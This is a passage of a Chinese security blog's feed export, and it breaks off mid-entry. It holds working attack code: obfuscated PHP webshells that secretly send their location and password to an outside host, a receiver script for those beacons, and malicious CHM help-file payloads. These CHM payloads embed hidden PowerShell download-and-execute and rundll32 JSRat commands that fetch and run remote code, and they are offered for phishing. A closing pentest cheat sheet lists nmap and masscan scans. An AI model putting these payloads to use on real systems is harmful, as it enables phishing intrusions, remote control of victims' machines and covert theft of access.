class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_00</span> = a;<br><span class="hljs-variable">$_11</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_22</span>=$&#123;<span class="hljs-variable">$_11</span>&#125;[<span class="hljs-variable">$_00</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=http://xx.xx.xx.xx/xss/index.php?do=api&amp;id=9vngN8&amp;location=&quot;</span>.<span class="hljs-variable">$_00</span>.<span class="hljs-string">&quot;&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将webshell密码赋值给location字段</p><p>然后xss平台接收到的请求，http referer就是目标上传的木马地址，location的值就是连接密码</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_backdoor/php04.png"></p><h3 id="自写接收网站"><a href="#自写接收网站" class="headerlink" title="自写接收网站"></a>自写接收网站</h3><p>自己用php写一个简单的接收requests并记录到txt或数据库的web页面</p><p>给出一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>];<br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;passwd&quot;</span>];<br><span class="hljs-variable">$log</span> = fopen(<span class="hljs-string">&quot;save.txt&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>fwrite(<span class="hljs-variable">$log</span>, <span class="hljs-variable">$url</span> .<span class="hljs-string">&quot;  &quot;</span> .<span class="hljs-variable">$pass</span>. <span class="hljs-string">&quot;\n&quot;</span>);<br>fclose(<span class="hljs-variable">$log</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后将如下木马上传并访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_00</span> = a;<br><span class="hljs-variable">$_11</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_22</span>=$&#123;<span class="hljs-variable">$_11</span>&#125;[<span class="hljs-variable">$_00</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=http://xx.xx.xx.xx/req.php?url=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot;&amp;passwd=&quot;</span>.<span class="hljs-variable">$_00</span>.<span class="hljs-string">&quot;&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到save.txt内容</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_backdoor/php05.png"></p><h3 id="不经过浏览器访问情况获取"><a href="#不经过浏览器访问情况获取" class="headerlink" title="不经过浏览器访问情况获取"></a>不经过浏览器访问情况获取</h3><p>有时使用这些木马的人并不会去访问以下自己的webshell页面，而是直接用连接工具连接，这时就不适合用img src的方式，可以采用file_get_contents()函数发出请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_00</span> = a;<br><span class="hljs-variable">$_11</span> = base64_decode(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_22</span>=$&#123;<span class="hljs-variable">$_11</span>&#125;[<span class="hljs-variable">$_00</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_22</span>);<br><span class="hljs-variable">$req</span> = <span class="hljs-string">&quot;http://xx.xx.xx.xx/req.php?url=&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot;&amp;passwd=&quot;</span>.<span class="hljs-variable">$_00</span>;<br>file_get_contents(<span class="hljs-variable">$req</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="隐藏特征"><a href="#隐藏特征" class="headerlink" title="隐藏特征"></a>隐藏特征</h3><p>明文将服务器地址写出来，一眼就会被看出来有问题，在使用前我们还需要对木马进行一定的编码、加密处理，使其更混乱一点。</p><p>简单举个例子，实际最好用更复杂的逻辑来做：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_00</span> = a;<br><span class="hljs-variable">$_01</span> = <span class="hljs-string">&quot;edoced_&quot;</span>;<br><span class="hljs-variable">$_02</span> = <span class="hljs-string">&quot;46esab&quot;</span>;<br><span class="hljs-variable">$_11</span> = strrev(<span class="hljs-variable">$_01</span>.<span class="hljs-variable">$_02</span>)(<span class="hljs-string">&quot;X1B____PU1_____Q=___&quot;</span>);<br><span class="hljs-variable">$_22</span>=$&#123;<span class="hljs-variable">$_11</span>&#125;[<span class="hljs-variable">$_00</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_22</span>);<br><span class="hljs-variable">$req</span> = <span class="hljs-string">&quot;==_QP__sJXd/AHaw5SclJ3L4___hnL4hnL4hnL4___h3LvoDc0RHa&quot;</span>;<br><span class="hljs-variable">$_33</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot;&amp;passwd=&quot;</span>.<span class="hljs-variable">$_00</span>;<br>file_get_contents(strrev(<span class="hljs-variable">$_01</span>.<span class="hljs-variable">$_02</span>)(strrev(<span class="hljs-variable">$req</span>)).<span class="hljs-variable">$_33</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功传输：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_backdoor/php06.png"></p><p>不过稍微审计一下就会发现，或者动态的尝试一下就会发现有连接外部的操作。</p><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>本来打算把《带后门webshell制作》和《快速鉴别webshell后门》写到一篇的，但是最近有点懒，十几篇想写的笔记都写了一半或者开头就没怎么动了，所以等想写了再单独发一篇吧。</p>]]></content>
    
    
    <categories>
      
      <category>webshell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过恶意chm文件getshell</title>
    <link href="/2021/06/18/%E9%80%9A%E8%BF%87%E6%81%B6%E6%84%8Fchm%E6%96%87%E4%BB%B6getshell/"/>
    <url>/2021/06/18/%E9%80%9A%E8%BF%87%E6%81%B6%E6%84%8Fchm%E6%96%87%E4%BB%B6getshell/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>chm是Compiled HTML Help file的缩写，意为已编译的HTML帮助文件，当攻击者将恶意代码写入chm中，当用户点击就会执行预设的恶意命令。</p><h2 id="chm命令执行示例"><a href="#chm命令执行示例" class="headerlink" title="chm命令执行示例"></a>chm命令执行示例</h2><p>下载安装html help workshop</p><p>使用html help workshop创建新项目，选择一个.hhp文件为目标</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm01.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm02.png"></p><p>创建并添加恶意html文件（执行calc），内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Mousejack replay<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>command exec <br><span class="hljs-tag">&lt;<span class="hljs-name">OBJECT</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">1</span> <span class="hljs-attr">height</span>=<span class="hljs-string">1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Command&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ShortCut&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Item1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;,calc.exe&#x27;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Item2&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">OBJECT</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><br>x.Click();<br><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm03.png"></p><p>选择file-compile编译得到chm文件</p><p>运行chm文件，成功打开计算器</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm04.png"></p><h2 id="使用cs木马配合CHM-getshell"><a href="#使用cs木马配合CHM-getshell" class="headerlink" title="使用cs木马配合CHM getshell"></a>使用cs木马配合CHM getshell</h2><p>攻击-钓鱼攻击-Scripted Web Delivery</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm05.png"></p><p>生成powershell的payload</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm06.png"></p><p>复制内容</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell.exe -nop -w <span class="hljs-keyword">hidden</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://xx.xx.xx.xx:90/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>将其填充到html中替换calc，powershell.exe之后要多添加一个逗号，并将引号冲突重新解决一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Mousejack replay<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>command exec <br><span class="hljs-tag">&lt;<span class="hljs-name">OBJECT</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">1</span> <span class="hljs-attr">height</span>=<span class="hljs-string">1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Command&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ShortCut&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Item1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&quot;http://xx.xx.xx.xx:90/a&quot;))&#x27;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Item2&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">OBJECT</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><br>x.Click();<br><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编译生成chm，运行上线</p><h2 id="使用nishang-Out-Chm-ps1制作恶意chm文档"><a href="#使用nishang-Out-Chm-ps1制作恶意chm文档" class="headerlink" title="使用nishang Out-Chm.ps1制作恶意chm文档"></a>使用nishang Out-Chm.ps1制作恶意chm文档</h2><p>使用msf或cs开启powershell的web_delivery</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">CHM</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><br><span class="hljs-built_in">Out</span><span class="hljs-operator">-</span><span class="hljs-variable">CHM</span> <span class="hljs-operator">-</span><span class="hljs-variable">PayloadURL</span> <span class="hljs-variable">http</span><span class="hljs-operator">://</span><span class="hljs-variable">xx</span><span class="hljs-operator">.</span><span class="hljs-variable">xx</span><span class="hljs-operator">.</span><span class="hljs-variable">xx</span><span class="hljs-operator">.</span><span class="hljs-variable">xx</span><span class="hljs-operator">:</span><span class="hljs-number">90</span><span class="hljs-operator">/</span> <span class="hljs-operator">-</span><span class="hljs-variable">HHCPath</span> <span class="hljs-string">&quot;C:\Program Files (x86)\HTML Help Workshop&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm07.png"></p><h2 id="通过CHM-JSRAT-Getshell"><a href="#通过CHM-JSRAT-Getshell" class="headerlink" title="通过CHM+JSRAT Getshell"></a>通过CHM+JSRAT Getshell</h2><p><a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">git clone https:<span class="hljs-comment">//github.com/Ridter/MyJSRat</span><br>cd MyJSRat<br>python MyJSRat<span class="hljs-selector-class">.py</span> -<span class="hljs-selector-tag">i</span> xx<span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span><span class="hljs-selector-class">.xx</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>访问其开启web的 /wtf路径，可得到payload</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm08.png"></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">rundll32.exe javascript:<span class="hljs-string">&quot;\..\mshtml,RunHTMLApplication &quot;</span>;document.write<span class="hljs-literal">()</span>;h=<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span>;h.<span class="hljs-constructor">Open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;http://xx.xx.xx.xx:8888/connect&quot;</span>,<span class="hljs-params">false</span>)</span>;<span class="hljs-keyword">try</span>&#123;h.<span class="hljs-constructor">Send()</span>;b=h.ResponseText;eval(b);&#125;catch(e)&#123;<span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-constructor">ActiveXObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)</span>.<span class="hljs-constructor">Run(<span class="hljs-string">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,0,<span class="hljs-params">true</span>)</span>;&#125;<br></code></pre></td></tr></table></figure><p>使用该payload替换Item1中的value，在rundll32.exe之后加上逗号，处理好单双引号冲突</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Mousejack replay<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>command exec <br><span class="hljs-tag">&lt;<span class="hljs-name">OBJECT</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">1</span> <span class="hljs-attr">height</span>=<span class="hljs-string">1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Command&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ShortCut&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Item1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;,rundll32.exe, javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://xx.xx.xx.xx:8888/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#x27;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">PARAM</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Item2&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;273,1,1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">OBJECT</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><br>x.Click();<br><span class="hljs-tag">&lt;/<span class="hljs-name">SCRIPT</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用上文提到的方式生成chm文件，双击打开上线</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/chm/chm09.png"></p>]]></content>
    
    
    <categories>
      
      <category>钓鱼</category>
      
    </categories>
    
    
    <tags>
      
      <tag>钓鱼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试各阶段工具速查(持续更新)</title>
    <link href="/2021/06/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%90%84%E9%98%B6%E6%AE%B5%E5%B7%A5%E5%85%B7%E9%80%9F%E6%9F%A5-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <url>/2021/06/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%90%84%E9%98%B6%E6%AE%B5%E5%B7%A5%E5%85%B7%E9%80%9F%E6%9F%A5-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是渗透测试各阶段工具和快速用法速查笔记，将会持续更新。<br>（2020-08-07更新）<br>（2021-06-17更新）</p><h3 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Google</span><br><span class="hljs-attribute">Fofa</span><br><span class="hljs-attribute">Shodan</span><br><span class="hljs-attribute">Zoomeye</span><br><span class="hljs-attribute">Goby</span><br><span class="hljs-attribute">whatweb</span><br><span class="hljs-attribute">Github</span><br><span class="hljs-attribute">robtex</span><br></code></pre></td></tr></table></figure><h3 id="快速探测存活主机"><a href="#快速探测存活主机" class="headerlink" title="快速探测存活主机"></a>快速探测存活主机</h3><p>ping</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1..255&#125;;<br><span class="hljs-keyword">do</span> <br> host=192.168.121.<span class="hljs-variable">$i</span><br> ping -c2  <span class="hljs-variable">$host</span>  &gt;/dev/null<br> <span class="hljs-keyword">if</span> [ $? = 0 ]<br> <span class="hljs-keyword">then</span>    <br> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.121.<span class="hljs-variable">$i</span> is connected&quot;</span><br> <span class="hljs-keyword">else</span><br> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.121.<span class="hljs-variable">$i</span> is not connected&quot;</span><br> <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>nmap</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">172.18.2.1</span>/<span class="hljs-number">24</span> -sS -Pn -n --open --min-hostgroup <span class="hljs-number">4</span> --min-parallelism <span class="hljs-number">1024</span> --host-timeout <span class="hljs-number">30</span> -T<span class="hljs-number">4</span> -v -oG result.txt<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">172.18.2.1</span>/<span class="hljs-number">24</span> -sS -Pn -n --open --min-hostgroup <span class="hljs-number">4</span> --min-parallelism <span class="hljs-number">1024</span> --host-timeout <span class="hljs-number">30</span> -T<span class="hljs-number">4</span> -v -oX result.xml<br><span class="hljs-attribute">nmap</span> -sS -Pn -n --open --min-hostgroup <span class="hljs-number">4</span> --min-parallelism <span class="hljs-number">1024</span> --host-timeout <span class="hljs-number">30</span> -T<span class="hljs-number">4</span> -v -oG result.txt -iL ip.txt<br></code></pre></td></tr></table></figure><p>格式化输出存活ip，做后续详细扫描使用<br><a href="https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py">https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</span><br><span class="hljs-deletion">-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</span><br><span class="hljs-deletion">-n： 禁止DNS反向解析；</span><br>–open： 只输出检测状态为open的端口，即开放的端口；<br>–min-hostgroup 4：调整并行扫描组的大小；<br>–min-parallelism 1024：调整探测报文的并行度；<br>–host-timeout 30：检测超时的跳过<br><span class="hljs-deletion">-T4：总共有T0-T5，貌似T4比较折中</span><br><span class="hljs-deletion">-v：打印详细扫描过程</span><br><span class="hljs-deletion">-oG：输出为比较人性化的格式，一条记录一行，后期好处理</span><br><span class="hljs-deletion">-iL：载入ip段文件，批量扫，不用一条条执行了。</span><br></code></pre></td></tr></table></figure><p>ipscan</p><h3 id="快速探测端口"><a href="#快速探测端口" class="headerlink" title="快速探测端口"></a>快速探测端口</h3><p>masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。<br><a href="https://www.freebuf.com/sectool/112583.html">https://www.freebuf.com/sectool/112583.html</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">masscan</span> <span class="hljs-number">172.18.2.1</span> -p<span class="hljs-number">1</span>-<span class="hljs-number">65535</span> --rate=<span class="hljs-number">10000</span><br><span class="hljs-attribute">masscan</span> -p<span class="hljs-number">80</span>,<span class="hljs-number">8080</span>-<span class="hljs-number">8100</span> <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span> -oL result_mas.txt --rate=<span class="hljs-number">10000</span><br><span class="hljs-attribute">masscan</span> -p<span class="hljs-number">80</span>,<span class="hljs-number">8080</span>-<span class="hljs-number">8100</span> <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span> -oX 